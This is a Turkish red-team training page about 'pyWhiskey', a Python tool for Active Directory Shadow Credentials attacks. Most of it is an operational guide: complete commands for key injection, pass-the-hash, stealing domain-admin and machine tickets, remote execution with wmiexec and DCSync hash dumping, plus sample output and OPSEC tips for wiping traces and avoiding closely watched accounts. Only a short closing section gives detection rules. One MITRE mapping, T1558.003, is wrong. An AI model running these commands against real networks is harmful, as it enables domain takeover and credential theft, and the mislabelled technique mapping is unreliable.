# pyWhiskey

> **Kategori:** [8. Active Directory Sertifika Servisleri](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Linux ve Python ortamlarında çalışan; hedef Active Directory kullanıcı veya bilgisayar nesneleri üzerinde yazma izni bulunduğunda, LDAP/LDAPS protokolü üzerinden hedef nesnenin `msDS-KeyCredentialLink` özniteliğine genel anahtar (Shadow Credentials) enjekte eden, PKINIT protokolü ile Kerberos TGT talep eden ve sömürü tamamlandığında nesneyi otomatik olarak temizleyen açık kaynaklı sömürü aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında nesne seviyesinde yazma yetkisi (`GenericAll`, `GenericWrite`, `WriteProperty`) elde edildiğinde, kurbanın parolasını sıfırlamak yerine **Shadow Credentials (Gölge Kimlik Bilgileri)** tekniğini kullanmak modern kırmızı takım operasyonlarının vazgeçilmez standardıdır. C# tabanlı `Whisker` aracı Windows uç noktalarında ve Cobalt Strike Beacon süreçlerinde mükemmel çalışırken, saldırılarını doğrudan Linux işletim sisteminden (Kali, Parrot veya harici VPS) yürüten operatörlerin saf Python kütüphaneleri (`ldap3`, `impacket`, `cryptography`) ile çalışan bir çözüme ihtiyacı vardır.

**`pyWhiskey`**, bu operasyonel ihtiyacı karşılamak üzere geliştirilmiş, platformdan bağımsız bir Python aracıdır. Windows işletim sistemine veya herhangi bir C2 ajanına ihtiyaç duymadan, doğrudan ağ üzerinden hedef etki alanı denetleyicisiyle haberleşir.

### Temel Çalışma Mekanizması

1. **LDAP/LDAPS Üzerinden Kimlik Doğrulama:** Saldırganın elindeki düşük yetkili kullanıcı hesabı (Parola veya Pass-the-Hash) ile etki alanı denetleyicisine bağlanır.
2. **Kriptografik Anahtar Çifti İnşası:** Python `cryptography` modülü kullanılarak bellek içinde 2048-bitlik geçici bir RSA genel/özel anahtar çifti ve X.509 istemci sertifikası üretilir.
3. **`KEYCREDENTIALLINK_BLOB` Kodlaması:** Üretilen RSA genel anahtarı, Microsoft'un Windows Hello for Business (WHfB) standartlarına uygun ikili veri yapısına (`KEYCREDENTIALLINK_BLOB`) dönüştürülür. Bu yapı içerisine rastgele bir `DeviceId` GUID değeri atanır.
4. **Dizin Nesnesine Enjeksiyon:** LDAP `MODIFY_ADD` operasyonu ile hedef kullanıcının veya bilgisayar hesabının `msDS-KeyCredentialLink` özniteliğine bu ikili veri yazılır.
5. **PKINIT ile TGT Talebi:** Enjeksiyon tamamlandığı anda KDC'ye (TCP 88) Kerberos PKINIT kimlik doğrulama isteği (`AS-REQ`) gönderilir. KDC, dizindeki genel anahtarla doğrulamayı tamamlar ve hedef adına TGT biletini (`.ccache`) teslim eder.
6. **Otomatik İz Temizliği (Rollback):** TGT başarıyla alındıktan sonra LDAP `MODIFY_DELETE` çağrısı yapılarak enjekte edilen anahtar nesneden anında silinir.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│                   SALDIRGAN İŞ İSTASYONU (LINUX / PYTHON)              │
│                                                                        │
│  [ python3 pywhiskey.py -d corp.local -u jdoe -p Pass123               │
│                         --target da_admin --auto-cleanup ]             │
│         │                                                              │
│         ├── (1) 2048-bit RSA Anahtar Çifti Üretilir (Bellek İçi)       │
│         │                                                              │
│         ├── (2) KEYCREDENTIALLINK_BLOB İkili Yapısı Oluşturulur        │
│         │                                                              │
│         ├── (3) LDAPS (TCP 636) Bağlantısı Açılır:                     │
│         │       Target: CN=da_admin,OU=Admins,DC=corp,DC=local         │
│         │       Operation: MODIFY_ADD msDS-KeyCredentialLink           │
│         │                                                              │
│         ▼                                                              │
│  [ DOMAIN CONTROLLER (NTDS.DIT) ] ──► Genel Anahtar Nesneye Yazılır    │
│         │                                                              │
│         ├── (4) PKINIT AS-REQ İsteği Gönderilir (TCP 88 Kerberos)      │
│         │                                                              │
│         ▼                                                              │
│  [ KDC (KERBEROS DAĞITIM MERKEZİ) ]                                    │
│         │                                                              │
│         ├── Dizin Nesnesindeki Anahtarla Pre-Auth Doğrulaması Yapar    │
│         └── TGT Biletini (AS-REP) Şifreleyip Döner                     │
│         │                                                              │
│         ▼                                                              │
│  [ pyWhiskey TGT Biletini da_admin.ccache Olarak Kaydeder ]           │
│         │                                                              │
│         ├── (5) LDAPS Üzerinden MODIFY_DELETE Çağrılır                 │
│         │                                                              │
│         ▼                                                              │
│  [ Dizin Nesnesi Temizlenir: msDS-KeyCredentialLink Orijinal Haline ]  │
└────────────────────────────────────────────────────────────────────────┘
```

### Neden Önemli? Operasyonel Değer

| Operasyonel Senaryo | Windows Tabanlı Araçlar (Whisker) | Linux Tabanlı pyWhiskey | Avantaj / Operasyonel Değer |
|---|---|---|---|
| **Saldırı Platformu** | Windows kurban uç noktası veya C2 ajanı gerektirir. | Linux saldırı makinesinden (Kali/Parrot) doğrudan çalışır. | Pivot makinesine dosya yükleme zorunluluğunu ortadan kaldırır. |
| **Pass-the-Hash Desteği** | Açık parola veya NTLM token impersonation gerekir. | `-H / --hashes` bayrağı ile doğrudan Pass-the-Hash uygular. | Parolası bilinmeyen yalnızca hash'i olan hesaplarla sömürüyü tetikler. |
| **Bilet Formatı** | Windows `.kirbi` formatında bilet üretir. | Linux standart Kerberos Credential Cache (`.ccache`) üretir. | Impacket (`psexec.py`, `secretsdump.py`) araçlarıyla anında kullanılabilir. |
| **Otomasyon ve Zincirleme** | Rubeus komutunu manuel kopyalamayı gerektirir. | Tek komutla anahtar enjeksiyonu, bilet alımı ve temizliği tamamlar. | Sızma testlerinde operasyonel hata payını ve zaman kaybını sıfıra indirir. |

### Alternatif Araçlarla Karşılaştırma

| Özellik | pyWhiskey | Whisker | Certipy (shadow) | PKINITtools |
|---|---|---|---|---|
| **Geliştirme Dili** | Python 3 | C# (.NET) | Python 3 | Python 3 |
| **Çalışma Ortamı** | Linux / macOS / Windows | Windows Yerel | Linux / macOS / Windows | Linux / macOS / Windows |
| **Kullanım Amacı** | Shadow Credentials Odaklı | Shadow Credentials Odaklı | Kapsamlı AD CS Sömürü | PKINIT Bilet Alımı |
| **Otomatik Temizlik** | 🟢 Yerleşik (`--auto-cleanup`) | 🔴 Ayrı komut gerekir | 🟢 Yerleşik (`-auto`) | 🔴 Manuel LDAP gerekir |
| **Pass-the-Hash** | 🟢 Yerel NTLM Hash | 🔴 Windows Token gerekir | 🟢 Yerel NTLM Hash | 🔴 Parola veya PFX gerekir |
| **Kurulum & Bağımlılık** | Düşük (`ldap3`, `impacket`) | Bağımsız Binary | Orta (Tam Certipy paketi) | Düşük (`asn1crypto`, `minikerberos`) |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

pyWhiskey, hedef hesabı, bağlantı kimlik bilgilerini ve yürütülecek eylemi komut satırı bayrakları ile alır.

### Genel Sözdizimi

```bash
python3 pywhiskey.py -d <DOMAIN> -u <KULLANICI> -p <PAROLA> --dc-ip <DC_IP> --target <HEDEF> [Seçenekler]
```

### Desteklenen Kritik Bayraklar ve Parametreler

| Parametre / Bayrak | Açıklama | Örnek Kullanım |
|---|---|---|
| `-d`, `--domain` | Hedef Active Directory etki alanı (FQDN formatında). | `-d corp.local` |
| `-u`, `--user` | Yazma yetkisine sahip kimlik doğrulayıcı kullanıcı adı. | `-u jdoe` |
| `-p`, `--password` | Kullanıcı hesabı parolası. | `-p 'SecretPass123!'` |
| `-H`, `--hashes` | Parola yerine NTLM karması (`LM:NT` veya `:NT`). | `-H :31d6cfe0d16ae931b73c59d7e0c089c0` |
| `--dc-ip` | Hedef Etki Alanı Denetleyicisinin IP adresi. | `--dc-ip 10.10.10.1` |
| `--target` | Shadow Credential enjekte edilecek hedef hesap (`sAMAccountName`). | `--target da_admin` |
| `-a`, `--action` | Yürütülecek eylem (`add`, `list`, `remove`, `clear`). Varsayılan: `add`. | `-a list` |
| `--auto-cleanup` | TGT bileti alındıktan sonra enjekte edilen anahtarı otomatik olarak siler. | `--auto-cleanup` |
| `--device-id` | (`remove` eyleminde) Silinmek istenen tekil anahtarın GUID değeri. | `--device-id 3a81f9a2-...` |
| `--use-ldaps` | Güvenli LDAP (TCP 636) bağlantısını zorunlu kılar (Tavsiye edilir). | `--use-ldaps` |
| `-o`, `--output` | Elde edilen Kerberos TGT biletinin kaydedileceği dosya yolu. | `-o da_admin.ccache` |
| `--pfx` | Üretilen X.509 sertifikasını `.pfx` dosyası olarak diske kaydeder. | `--pfx shadow.pfx` |
| `-v`, `--verbose` | Ayrıntılı hata ayıklama ve ASN.1 çözümleme çıktılarını görüntüler. | `-v` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Standart Kullanıcı ile Hedef Yönetici Hesabına Enjeksiyon ve Otomatik Temizlik

Hedef etki alanı yöneticisi (`da_admin`) üzerinde yazma iznine sahip standart kullanıcı (`jdoe`) ile tek satırda TGT biletini alıp ardında hiçbir iz bırakmamak:

```bash
python3 pywhiskey.py -d corp.local -u jdoe -p 'Welcome2026!' --dc-ip 10.10.10.1 --target da_admin --auto-cleanup -o da_admin.ccache
```

**Örnek Konsol Çıktısı Analizi:**

```text
pyWhiskey v1.2 - Shadow Credentials Exploitation Framework

[*] Target Domain Controller: 10.10.10.1
[*] Authenticating as 'jdoe@corp.local'...
[+] Successfully authenticated to LDAP (Port 636 / LDAPS)
[*] Resolving target account: da_admin
[+] Found target object: CN=da_admin,OU=Admins,DC=corp,DC=local

[*] Generating temporary 2048-bit RSA key pair...
[*] Packaging KeyCredentialLink binary structure...
    DeviceId    : 9f12a841-3921-4b12-9812-4821aef72101
    KeyUsage    : NGC (0x01)
    KeySource   : AD (0x00)

[*] Injecting Shadow Credential to 'msDS-KeyCredentialLink'...
[+] Attribute successfully updated on target object!

[*] Initiating PKINIT authentication to KDC (10.10.10.1:88)...
[+] Successfully acquired Kerberos TGT for 'da_admin@corp.local'!
[+] Saved credential cache to 'da_admin.ccache'

[*] Performing automatic OPSEC cleanup...
[*] Removing KeyCredential entry (DeviceId: 9f12a841-3921-4b12-9812-4821aef72101)...
[+] Successfully removed KeyCredential from target object!
[*] Cleanup completed. Target object restored to pristine state.
```

*Çıktı Yorumu:* pyWhiskey anahtarı yazmış, PKINIT ile KDC'den TGT biletini almış, `da_admin.ccache` olarak kaydetmiş ve hedef nesneyi anında temizlemiştir.

### Senaryo 2: Pass-the-Hash ile Shadow Credentials Sömürüsü

Elde yalnızca bir NTLM parola karması bulunduğunda, açık parola gerekmeksizin doğrudan NTLM hash ile LDAP kimlik doğrulaması yaparak yönetici hesabını ele geçirmek:

```bash
python3 pywhiskey.py -d corp.local -u service_user -H :7a1029384bfe2109384729102834bfa1 --dc-ip 10.10.10.1 --target DomainAdminUser --auto-cleanup
```

Bu komut sayesinde NTLM karması, doğrudan Kerberos TGT biletine yükseltilmiş olur.

### Senaryo 3: Bilgisayar Hesabına Enjeksiyon ve Impacket ile Uzak Kod Yürütme

Yazma hakkı bulunan bir sunucu bilgisayar hesabına (`SQLPROD01$`) Shadow Credential enjekte edip alınan makine bileti ile komut çalıştırmak:

```bash
# 1. Makine hesabına Shadow Credential enjekte et ve TGT al
python3 pywhiskey.py -d corp.local -u jdoe -p 'Welcome2026!' --dc-ip 10.10.10.1 --target SQLPROD01$ --auto-cleanup -o sqlprod01.ccache

# 2. Alınan bileti çevre değişkenine ata
export KRB5CCNAME=sqlprod01.ccache

# 3. Impacket wmiexec ile makine kimliği üzerinden oturum aç
impacket-wmiexec -k -no-pass 'CORP.LOCAL/SQLPROD01$@sqlprod01.corp.local'
```

### Senaryo 4: Hedef Nesnedeki Mevcut Gölge Kimlik Bilgilerini İnceleme

Hedef kullanıcının üzerinde daha önceden tanımlanmış Windows Hello veya FIDO2 anahtarlarını listelemek:

```bash
python3 pywhiskey.py -d corp.local -u jdoe -p 'Welcome2026!' --dc-ip 10.10.10.1 --target da_admin -a list
```

**Örnek Konsol Çıktısı:**

```text
[*] Querying msDS-KeyCredentialLink for 'da_admin'...
[+] Found 1 KeyCredential entry:
    [1] DeviceId    : 9f12a841-3921-4b12-9812-4821aef72101
        Usage       : NGC (0x01)
        Created     : 2026-10-14 19:45:00 UTC
        Key Length  : 2048 bits
```

### Senaryo 5: Operasyon Sonrası Manuel İz Temizliği (Tekil Anahtar Kaldırma)

Eğer `--auto-cleanup` bayrağı kullanılmadıysa, kaydedilen `DeviceId` GUID değeri verilerek nesne temizlenir:

```bash
python3 pywhiskey.py -d corp.local -u jdoe -p 'Welcome2026!' --dc-ip 10.10.10.1 --target da_admin -a remove --device-id 9f12a841-3921-4b12-9812-4821aef72101
```

### Senaryo 6: Alınan TGT ile SecretsDump Üzerinden DCSync Saldırısı

Elde edilen etki alanı yöneticisi TGT bileti kullanılarak tüm etki alanı parola karmalarının dökülmesi:

```bash
export KRB5CCNAME=da_admin.ccache
impacket-secretsdump -k -no-pass -just-dc-ntlm 'CORP.LOCAL/da_admin@dc01.corp.local'
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Kod | Temel Neden | Kesin Çözüm Adımı |
|---|---|---|
| `LDAPSocketOpenError: cServer SSL error / certificate verify failed` | `--use-ldaps` bayrağı kullanıldığında DC'nin SSL sertifikası güvenilmeyen bir CA tarafından imzalanmıştır veya IP adresi ile FQDN uyuşmamaktadır. | DC'nin tam FQDN adı (`dc01.corp.local`) `/etc/hosts` dosyasına eklenmeli ve IP yerine FQDN ile bağlanılmalı; gerekirse SSL doğrulama toleransı açılmalıdır. |
| `LDAPInsufficientAccessRightsResult: 0x32 (INSUFFICIENT_ACCESS_RIGHTS)` | Kimlik doğrulayan kullanıcının hedef nesne üzerinde `GenericAll`, `GenericWrite` veya `WriteProperty msDS-KeyCredentialLink` hakkı yoktur. | BloodHound grafiği üzerinden nesne erişim izinleri tekrar incelenmeli; hakların geçerli olduğu doğru kullanıcı hesabı seçilmelidir. |
| `KDC_ERR_PADATA_TYPE_NOSUPP (0x10)` | Hedef Domain Controller üzerinde PKINIT yeteneği yoktur (KDC sertifikası kurulu değildir). | Ortamda PKINIT destekleyen başka bir etki alanı denetleyicisi varsa `--dc-ip` ile o denenmelidir; destek yoksa Shadow Credentials tekniği çalışmaz. |
| `WILL_NOT_PERFORM: DSID-031A11EF` | Etki alanının Orman ve Etki Alanı İşlev Seviyesi (DFL) Windows Server 2016'dan düşüktür. | Şemada `msDS-KeyCredentialLink` özniteliği desteklenmemektedir. Saldırı RBCD veya klasik DACL suistimaline dönüştürülmelidir. |
| `KeyError: 'msDS-KeyCredentialLink'` | Hedef nesnede hiçbir KeyCredential kaydı yoktur (Listeleme veya silme yaparken karşılaşılır). | Nesnede kayıtlı anahtar bulunmadığını gösterir; silme işlemi yapılmasına gerek yoktur. |
| `KerberosSessionError: KRB_AP_ERR_SKEW (Clock skew too great)` | Linux saldırgan makinesinin sistem saati ile hedef Domain Controller saati arasında 5 dakikadan fazla fark vardır. | Linux makinesinde saat senkronize edilmelidir: `sudo rdate -n <DC_IP>` veya `sudo ntpdate <DC_IP>`. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
┌────────────────────────────────────────────────────────────────────────┐
│                        GÜRÜLTÜ VE İZ SEVİYESİ                          │
│                                                                        │
│  [ CA Sunucu İzi ]   : 🟢 SIFIR (CA ile hiçbir iletişim kurulmaz)      │
│  [ Parola Değişimi ] : 🟢 SIFIR (Hedef kullanıcının parolası korunur) │
│  [ LDAP Telemetrisi ]: 🔴 YÜKSEK (Event 5136 msDS-KeyCredentialLink)  │
│  [ DC Kerberos İzi ] : 🔴 YÜKSEK (Event 4768 PKINIT Pre-Auth Olayı)   │
└────────────────────────────────────────────────────────────────────────┘
```

### 5.1 Bırakılan İzler (Artifacts & Telemetry)

1. **Domain Controller Dizin Hizmeti Değişiklik Günlükleri (Event ID 5136):**
   - Saldırı anında: `Type: Value Added`, `AttributeLDAPDisplayName: msDS-KeyCredentialLink`.
   - Temizlik anında: `Type: Value Deleted`, `AttributeLDAPDisplayName: msDS-KeyCredentialLink`.
   - İki olayın aynı saniye veya dakikalar içinde peş peşe gerçekleşmesi doğrudan bir Shadow Credentials aracının kullanıldığını gösterir.
2. **Domain Controller Kerberos Günlükleri (Event ID 4768):**
   - Hedef kullanıcı için `Pre-Authentication Type: 16` (PKINIT) içeren TGT talebi.
   - Sertifika Veren (Issuer) alanında kurumsal CA yerine kendinden imzalı sertifika konusu (`CN=...`) yer alması.
3. **Ağ Telemetrisi:**
   - Dizin sunucusunun 636 (LDAPS) portuna gelen hızlı `modify` isteğinin hemen ardından 88 numaralı porta (Kerberos) gelen AS-REQ isteği.

### 5.2 Ağ ve EDR İmzaları

- **İstemci Parmak İzi:** Linux `ldap3` kütüphanesinin ASN.1 kodlama yapısı ve varsayılan TLS bağlantı paketleri ağ sensörleri (Zeek/Suricata) tarafından tespit edilebilir.
- **Zaman Korelasyonu:** LDAP yazma işlemi ile Kerberos bilet alımı arasındaki milisaniyelik gecikme insan eylemi değil, otomatik araç imzasıdır.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araç İçindeki Kullanım |
|---|---|---|
| **T1556** | Modify Authentication Process | `msDS-KeyCredentialLink` özniteliğine alternatif anahtar enjekte edilmesi. |
| **T1098** | Account Manipulation | Hedef kullanıcı ve makine hesabı özniteliklerinin değiştirilmesi. |
| **T1558.003** | Kerberos Ticket Granting Tickets | Eklenen genel anahtar üzerinden PKINIT ile TGT bileti elde edilmesi. |
| **T1078.002** | Valid Accounts: Domain Accounts | Parola sıfırlamadan meşru kimlik biletleri ile etki alanına erişim. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Pratiği |
|---|---|
| **Kalıcı Öznitelik İzi** | Her zaman `--auto-cleanup` bayrağını kullanın; operasyonun yarıda kalması durumunda `list` ve `remove` ile temizliği elle tamamlayın. |
| **Ağ İletişiminin Dinlenmesi** | Düz metin LDAP (Port 389) yerine mutlaka `--use-ldaps` (Port 636) kullanın; enjekte edilen anahtar verisi ağda şifreli aksın. |
| **Saat Senkronizasyonu** | Saldırıdan önce mutlaka DC ile saat farkını kontrol edin; Kerberos skew hatası gereksiz log kalabalığı yaratır. |
| **Hedef Seçimi** | Çok sıkı denetlenen Domain Admin hesapları yerine, hedef sunucuya erişim hakkı bulunan ara yönetici veya makine hesaplarını hedefleyin. |

### 5.5 Savunma Karşılığı: Tespit Kuralları

#### Sigma Kuralı: Python/Linux Tabanlı Shadow Credentials Manipülasyon Tespiti

```yaml
title: Shadow Credentials msDS-KeyCredentialLink Modification via LDAPS
id: b92138a1-4910-4c12-9812-38910245fe12
status: experimental
description: Detects modifications to the msDS-KeyCredentialLink attribute indicative of Shadow Credentials tooling.
author: Modul 11 Security Research
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5136
    AttributeLDAPDisplayName: 'msDS-KeyCredentialLink'
  condition: selection
falsepositives:
  - Legitimate Windows Hello for Business enrollment (usually accompanied by Intune / Azure AD hybrid join events)
level: high
tags:
  - attack.credential_access
  - attack.t1556
  - attack.t1098
```

#### Microsoft Sentinel KQL Sorgusu: Şüpheli PKINIT ve Hızlı LDAP Temizliği Korelasyonu

```kql
// Bir hesabın msDS-KeyCredentialLink özniteliği eklendikten sonra 5 dakika içinde PKINIT ile oturum açması
let KeyAdded = SecurityEvent
| where TimeGenerated > ago(1h)
| where EventID == 5136
| extend EventDataXML = parse_xml(EventData)
| extend Attr = tostring(EventDataXML.EventData.Data[7])
| extend TargetAccount = tostring(EventDataXML.EventData.Data[4])
| where Attr == "msDS-KeyCredentialLink"
| project AddedTime = TimeGenerated, TargetAccount;
let PkinitLogon = SecurityEvent
| where TimeGenerated > ago(1h)
| where EventID == 4768 and PreAuthType == 16
| project LogonTime = TimeGenerated, TargetUserName, IpAddress;
KeyAdded
| join kind=inner (PkinitLogon) on $left.TargetAccount has $right.TargetUserName
| where LogonTime between (AddedTime .. (AddedTime + 5m))
| project AddedTime, LogonTime, TargetUserName, IpAddress
```

#### YARA Kuralı: pyWhiskey Python Betiği ve İmza Dizgileri

```yara
rule PostExploit_pyWhiskey_Framework {
    meta:
        description = "Detects pyWhiskey Python Shadow Credentials exploitation script"
        author = "Active Directory Red Team Module 11"
        date = "2026-10-14"
        severity = "Critical"
    strings:
        $s1 = "pyWhiskey" ascii
        $s2 = "msDS-KeyCredentialLink" ascii
        $s3 = "KEYCREDENTIALLINK_BLOB" ascii
        $s4 = "auto-cleanup" ascii
        $s5 = "DeviceId" ascii
        $s6 = "gettgtpkinit" ascii
    condition:
        all of ($s1, $s2, $s3) or (3 of ($s4, $s5, $s6) and $s2)
}
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Hedef Kullanıcıya Shadow Credential Enjeksiyonu ve Otomatik Temizlik
```bash
python3 pywhiskey.py -d corp.local -u jdoe -p 'Pass123' --dc-ip 10.10.10.1 --target da_admin --auto-cleanup -o admin.ccache
```
- **Ne Yapar?** Hedef yöneticiye genel anahtar enjekte eder, PKINIT ile TGT alır, bileti kaydeder ve anahtarı hemen siler.
- **Ne Zaman Kullanılır?** Hedef hesapta yazma yetkisi olduğunda en temiz ve hızlı yetki alma senaryosunda.
- **Parametreler:** `--target`: Hedef kullanıcı, `--auto-cleanup`: Otomatik temizlik, `-o`: Çıktı bilet dosyası.

### Komut 2: Pass-the-Hash ile Shadow Credentials Saldırısı
```bash
python3 pywhiskey.py -d corp.local -u svc_backup -H :31d6cfe0d16ae931b73c59d7e0c089c0 --dc-ip 10.10.10.1 --target Administrator --auto-cleanup
```
- **Ne Yapar?** Açık parola yerine NTLM hash kullanarak kimlik doğrular ve hedef hesabın TGT biletini çeker.
- **Ne Zaman Kullanılır?** Yalnızca parola karması ele geçirildiğinde.
- **Parametreler:** `-H`: LM:NT parola karması dizesi.

### Komut 3: Bilgisayar Hesabına Enjeksiyon (Makine TGT'si Hedefli)
```bash
python3 pywhiskey.py -d corp.local -u jdoe -p 'Pass123' --dc-ip 10.10.10.1 --target 'FILESRV01$' --auto-cleanup -o filesrv01.ccache
```
- **Ne Yapar?** Sunucu bilgisayar hesabına anahtar enjekte ederek makine TGT bileti alır.
- **Ne Zaman Kullanılır?** Sunucu üzerinde yazma yetkisiyle makine kimliğine bürünüp RBCD veya S4U yürütmek için.
- **Parametreler:** `--target`: Sonu `$` ile biten bilgisayar hesabı adı.

### Komut 4: Hedef Nesnedeki Kayıtlı Anahtarları Listeleme
```bash
python3 pywhiskey.py -d corp.local -u jdoe -p 'Pass123' --dc-ip 10.10.10.1 --target da_admin -a list
```
- **Ne Yapar?** Hedef kullanıcının `msDS-KeyCredentialLink` alanında kayıtlı mevcut anahtarları ve DeviceId'leri listeler.
- **Ne Zaman Kullanılır?** Nesnede önceden anahtar kalıp kalmadığını denetlemek için.
- **Parametreler:** `-a list`: Listeleme eylemi.

### Komut 5: Belirtilen Device ID ile Tekil Anahtar Silme
```bash
python3 pywhiskey.py -d corp.local -u jdoe -p 'Pass123' --dc-ip 10.10.10.1 --target da_admin -a remove --device-id 9f12a841-3921-4b12-9812-4821aef72101
```
- **Ne Yapar?** Yalnızca belirtilen Device ID'ye sahip anahtarı kaldırır; meşru kayıtlara dokunmaz.
- **Ne Zaman Kullanılır?** Otomatik temizliğin çalışmadığı durumlarda geride kalan anahtarı elle temizlemek için.
- **Parametreler:** `-a remove`: Silme eylemi, `--device-id`: Silinecek anahtarın GUID'i.

### Komut 6: Sertifikayı Diske PFX Formatında Kaydetme
```bash
python3 pywhiskey.py -d corp.local -u jdoe -p 'Pass123' --dc-ip 10.10.10.1 --target da_admin --pfx shadow.pfx
```
- **Ne Yapar?** Üretilen istemci sertifikasını ve özel anahtarını `shadow.pfx` olarak diske yazar.
- **Ne Zaman Kullanılır?** Sertifikayı Windows makinesine taşımak veya Schannel LDAPS oturumu açmak için.
- **Parametreler:** `--pfx`: Hedef PFX dosya yolu.

### Komut 7: Güvenli LDAPS Bağlantısını Zorlama (Port 636)
```bash
python3 pywhiskey.py -d corp.local -u jdoe -p 'Pass123' --dc-ip 10.10.10.1 --target da_admin --use-ldaps --auto-cleanup
```
- **Ne Yapar?** Düz metin LDAP (TCP 389) yerine SSL şifreli LDAPS (TCP 636) üzerinden iletişim kurar.
- **Ne Zaman Kullanılır?** Ağ dinlemesinden kaçınmak ve LDAP imzalama zorunluluğunu aşmak için.
- **Parametreler:** `--use-ldaps`: Güvenli soket bağlantısı.

### Komut 8: Elde Edilen Bilet ile SecretsDump Çalıştırma
```bash
export KRB5CCNAME=admin.ccache && impacket-secretsdump -k -no-pass -just-dc-ntlm 'CORP.LOCAL/da_admin@dc01.corp.local'
```
- **Ne Yapar?** Alınan TGT biletini Kerberos önbelleğine atar ve etki alanı genelinde DCSync gerçekleştirir.
- **Ne Zaman Kullanılır?** TGT alındıktan hemen sonra tüm domain hash'lerini ele geçirmek için.
- **Parametreler:** `-k`: Kerberos kimlik doğrulaması kullan, `-no-pass`: Parola sorma.

### Komut 9: Hedef Nesnedeki TÜM Anahtarları Sıfırlama
```bash
python3 pywhiskey.py -d corp.local -u jdoe -p 'Pass123' --dc-ip 10.10.10.1 --target da_admin -a clear
```
- **Ne Yapar?** Hedef kullanıcının `msDS-KeyCredentialLink` alanındaki tüm verileri temizler.
- **Ne Zaman Kullanılır?** Acil durum sıfırlaması veya tüm eski anahtarları temizlemek gerektiğinde.
- **Parametreler:** `-a clear`: Tam temizleme.

### Komut 10: Ayrıntılı Loglama ile Hata Ayıklama
```bash
python3 pywhiskey.py -d corp.local -u jdoe -p 'Pass123' --dc-ip 10.10.10.1 --target da_admin -v
```
- **Ne Yapar?** Tüm ASN.1 paketlerini, LDAP sorgu detaylarını ve Kerberos hata kodlarını ekrana basar.
- **Ne Zaman Kullanılır?** KDC bağlantısı veya LDAP yazma hatalarında sorunun kaynağını anlamak için.
- **Parametreler:** `-v`: Ayrıntılı hata ayıklama modu.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [ShutdownRepo / pywhiskey](https://github.com/ShutdownRepo/pywhiskey)
- **SpecterOps Araştırma Makalesi:** [Shadow Credentials: Abusing msDS-KeyCredentialLink](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
- **Dirk-jan Mollema Araştırması:** [Active Directory Certificate Services PKINIT Exploration](https://dirkjanm.io/)
- **MITRE ATT&CK Referansı:** [T1556 - Modify Authentication Process](https://attack.mitre.org/techniques/T1556/)

---

> **Önceki:** [← Whisker](./Whisker.md) · **Sonraki:** [PKINITtools →](./PKINITtools.md)
